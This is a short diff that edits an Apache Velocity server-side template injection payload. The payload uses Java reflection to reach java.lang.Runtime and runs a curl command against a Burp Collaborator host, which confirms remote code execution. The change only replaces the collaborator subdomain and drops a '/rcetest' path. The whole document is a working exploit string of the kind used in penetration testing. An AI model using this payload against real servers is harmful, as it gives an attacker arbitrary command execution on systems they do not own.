@@ -1,2 +1,2 @@
 #set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl http://e1g06acqzajdlu1oqw7j1uipzg5ct1.burpcollaborator.net/rcetest?a=a")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl ycekhunaauuxwec81gi3cet9a0gx4m.burpcollaborator.net")
